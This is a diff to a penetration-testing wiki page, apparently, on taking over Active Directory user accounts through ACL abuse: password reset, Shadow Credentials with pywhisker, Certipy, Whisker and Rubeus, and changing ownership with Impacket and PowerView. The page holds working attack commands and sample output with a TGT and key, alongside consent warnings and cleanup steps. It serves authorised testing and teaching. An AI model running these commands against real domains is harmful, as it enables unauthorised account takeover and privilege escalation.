@@ -2,7 +2,7 @@
 title: Abuse ACL Access over User
 description: Use access rights over a user to take over that user account.
 categories: [Active Directory, Privilege Escalation]
-tags: [Active Direcotory, Privilege Escalation, Lateral Movement, ACL Abuse, Shadow Credentials]
+tags: [Active Directory, Privilege Escalation, Lateral Movement, ACL Abuse, Shadow Credentials]
 weight: 2
 ---
 
@@ -10,11 +10,11 @@ weight: 2
 The most naive method is to simply change that user's password. With `ForceChangePassword` access, which is included with `GenericAll` access on a user, we should be able to change that user's password without knowing their current password.
 
 {{% alert title="Note" %}}
-Change an account's password is considered **destructive** to the environment due to the potential disruption it may cause. With the account's password changed, Users may not be able to log in. If the account is a service account, the service can become unavailable. During real-life engagements, only use this technique if written consent from the client is obtained.
+Changing an account's password is considered **destructive** to the environment due to the potential disruption it may cause. With the account's password changed, users may not be able to log in. If the account is a service account, the service can become unavailable. During real-life engagements, only use this technique if written consent from the client is obtained.
 {{% /alert %}}
 
 ### Linux Perspective
-From the Linux perspective, we can use the `net` command that are part of the Samba toolkit or `bloodyAD` to achieve this.
+From the Linux perspective, we can use the `net` command that is part of the Samba toolkit or `bloodyAD` to achieve this.
 ```bash
 # Password for attacking user will be prompted
 net rpc password <target_user> -U <domain>/<username> -S <dc_ip>
@@ -26,11 +26,11 @@ bloodyAD --host <dc_ip> -d <domain> -u <username> -p <password> set password svc
 nxc smb <dc_host> -u <username> -p <password> -M change-password -o USER=<target_user> NEWPASS=<new_password>
 ```
 ```bash
-changepasswd.py <domain>/<username>:<password>@<dc_host> -altuser <target_user> -altpass <new_password>
+changepasswd.py '<domain>/<target_user>@<dc_host>' -no-pass -altuser '<domain>/<username>' -altpass '<password>' -reset -newpass '<new_password>'
 ```
 
 ### Windows Perspective
-We may use PowerView's `Set-DomainUserPassword` function to force change the target's password.
+We may use PowerView's `Set-DomainUserPassword` function to reset the target's password.
 ```powershell
 Import-Module .\PowerView.ps1
 $NewPassword = ConvertTo-SecureString <new_password> -AsPlainText -Force
@@ -43,23 +43,23 @@ We can leverage the ability to write the target user's `servicePrincipalName` pr
 Check out the article on [Kerberoasting]({{< relref "/docs/active_directory/movement/kerberos/kerberoast/#targeted-kerberoasting">}}) for more details.
 
 ## Shadow Credentials
-**Shadow Credentials** abuses the ability to write to the `msDS-KeyCredentialLink` attribute of the target user. The attribute is normally used for Windows Hello for Business or other Passwordless authentication in the Active Directory environment.
+**Shadow Credentials** abuses the ability to write to the `msDS-KeyCredentialLink` attribute of the target user. The attribute is normally used for Windows Hello for Business or other passwordless authentication in the Active Directory environment.
 
 {{% alert title="Note" %}}
 Requirements for this technique are:
-1. The domain must support PKINIT (Windows Server 2016+).
-2. Domain controllers has its own key pair (such as in cases when the DC is also a certificate authority for AD CS).
-3. We have control over an account who can edit the target account's `msDS-KeyCredentialLink` attribute (`GenericAll` or `GenericWrite`).
+1. The target DC must support Windows Server 2016+ key-trust authentication and the domain schema must include `msDS-KeyCredentialLink`. PKINIT itself predates Server 2016.
+2. The DC handling PKINIT must have a suitable certificate and private key. It need not host the CA; a bare key pair is not enough.
+3. We control an account that can write the target account's `msDS-KeyCredentialLink` attribute (for example, through effective `GenericAll`, `GenericWrite`, or attribute-specific write access).
 {{% /alert %}}
 
-Attack procedure involves:
-1. Attacker creates RSA public-private key pair.
-2. Attacker creates an X509 certificate configured with the public key.
-3. Attacker create a KeyCredential structure featuring the raw public key and add it to the `msDS-KeyCredentialLink` attribute.
-4. Attacker authenticate using PKINIT with the certificate and the private key, and obtain the user's TGT.
+The attack procedure involves:
+1. Attacker creates an RSA public-private key pair.
+2. Attacker creates an X.509 certificate configured with the public key.
+3. Attacker creates a KeyCredential structure featuring the raw public key and adds it to the `msDS-KeyCredentialLink` attribute.
+4. Attacker authenticates using PKINIT with the certificate and the private key, and obtains the user's TGT through key-trust mapping.
 
 ### Linux Perspective
-[pyWhisker](https://github.com/ShutdownRepo/pywhisker) may be used from a Linux attacker machine to create a key pair and add the public key to the `msDS-KeyCredentialLink` attribute of the target user. It then generate a #PKCS12 that contains the certificate and private key in the current working directory.
+[pyWhisker](https://github.com/ShutdownRepo/pywhisker) may be used from a Linux attacker machine to create a key pair and add the public key to the `msDS-KeyCredentialLink` attribute of the target user. It then generates a PKCS#12 file containing the certificate and private key in the current working directory.
 ```bash
 pywhisker -d <domain> -u <user> -p <password> --target <target_account> --action add [--use-ldaps]
 ```
@@ -92,12 +92,12 @@ python3 gettgtpkinit.py -cert-pfx <cert_path> -pfx-pass <cert_pass> <domain>/<ta
 2026-04-16 15:18:08,077 minikerberos INFO     71cf34fb9f98f093e6e6a8e35c3bebcc99b5cf677608774771f451640b019ad7
 2026-04-16 15:18:08,081 minikerberos INFO     Saved TGT to file
 ```
-To clear the `msDS-KeyCredentialLink` after we are done, we can use the following command:
+After we are done, remove only the KeyCredential we added, using its DeviceID. `--action clear` removes every credential in the attribute and can break existing Windows Hello for Business authentication.
 ```bash
-pywhisker -d <domain> -u <user> -p <password> --target <target_account> --action clear [--use-ldaps]
+pywhisker -d <domain> -u <user> -p <password> --target <target_account> --action remove --device-id <added_device_id> --use-ldaps
 ```
 
-Certipy's `shadow auto` subcommand automatically authenticates via PKINIT and retreives a TGT and NTLM hash of the target user after adding the Shadow Credential. The NTLM hash is retreived via **UnPAC the hash**.
+Certipy's `shadow auto` subcommand adds a Shadow Credential, authenticates via PKINIT, and attempts to retrieve a TGT and NT hash of the target user via **UnPAC the hash**. It also attempts to restore the previous Key Credentials; verify restoration rather than assuming cleanup succeeded after an error.
 ```bash
 certipy shadow auto -u <username>@<domain> -p <password> -account <target_account> -target <dc_ip> -ns <dc_ip>
 ```
@@ -128,7 +128,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 ```
 
 ### Windows Perspective
-From a domain Windows machine, we may use [Whisker](https://github.com/eladshamir/Whisker) to add Shadow Credential to the target user.
+From a domain Windows machine, we may use [Whisker](https://github.com/eladshamir/Whisker) to add a Shadow Credential to the target user.
 ```cmd
 Whisker.exe add /target:<target_username> /domain:<domain_fqdn> /dc:<dc_host> /path:<cert_path> /password:<pfx_password>
 ```
@@ -149,19 +149,19 @@ PS C:\temp> .\Whisker.exe add /target:svc_sql /domain:gundam.local /path:svc_sql
 Rubeus.exe asktgt /user:svc_sql /certificate:svc_sql.pfx /password:"cert_pass" /domain:gundam.local /dc:RA-CAILUM.GUNDAM.local /getcredentials /show
 ```
 
-Then, we may use [Rubeus](https://github.com/GhostPack/Rubeus) to request a TGT for the target object. Rubeus then print the TGT in base64 on console.
+Then, we may use [Rubeus](https://github.com/GhostPack/Rubeus) to request a TGT for the target object. Rubeus then prints the TGT in base64 on the console.
 ```cmd
 .\Rubeus.exe asktgt /user:<user> /certificate:<cert_file> /password:<cert_pass> /domain:<domain_fqdn> /dc:<dc_host> /getcredentials /show
 ```
 - If you get `KRB-ERROR (14) : KDC_ERR_ETYPE_NOTSUPP`, try setting `/enctype:aes128` or `/enctype:aes256`.
 
 ## Modify Ownership
-If we are able to modify the owner object over a user account, we can change the owner to an object we control and give that object full control access, allowing us to use any of the three methods above to take control of the target user account.
+If we have `WriteOwner` over a user account, we can normally take ownership as the principal exercising that right, then modify the DACL to grant access. Assigning an arbitrary new owner requires additional privileges. An `OWNER RIGHTS` ACE can restrict an owner's implicit DACL-write access, so ownership alone does not guarantee full control.
 
 ### Linux Perspective
 We use `owneredit.py` from Impacket to change the ownership of the user to an account we control.
 ```bash
-owneredit.py -action write -owner <username> -target <target_user> <domain>/<user>:<password>
+owneredit.py -action write -new-owner <username> -target <target_user> <domain>/<username>:<password>
 ```
 We then use `dacledit.py` from Impacket to give our user full control over the target user.
 ```bash
@@ -169,14 +169,14 @@ dacledit.py -action 'write' -rights 'FullControl' -principal <username> -target 
 ```
 
 ### Windows Perspective
-The PowerView function `Set-DomainObjectOwner` may be used to change the ownership of a user object from a domain-joined Windows machine. It must be ran from a process under the context of the user who has the access to modify ownership information over the target user, or we can create a PSCredential object, alternatively.
+The PowerView function `Set-DomainObjectOwner` may be used to change the ownership of a user object from a domain-joined Windows machine. It must be run from a process in the context of the user who has access to modify ownership information over the target user, or we can supply a PSCredential object instead.
 ```powershell
 $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $SecPassword)
 Set-DomainObjectOwner -Credential $Cred -TargetIdentity '<target_user>' -OwnerIdentity '<username>'
 ```
 
-We then use `Add-DomainObjectAcl` function from PowerView to give our user `GenericAll` access to the target user object.
+We then use the `Add-DomainObjectAcl` function from PowerView to give our user `GenericAll` access to the target user object.
 ```powershell
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity <target_user> -Rights All
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity <target_user> -PrincipalIdentity <username> -Rights All
 ```
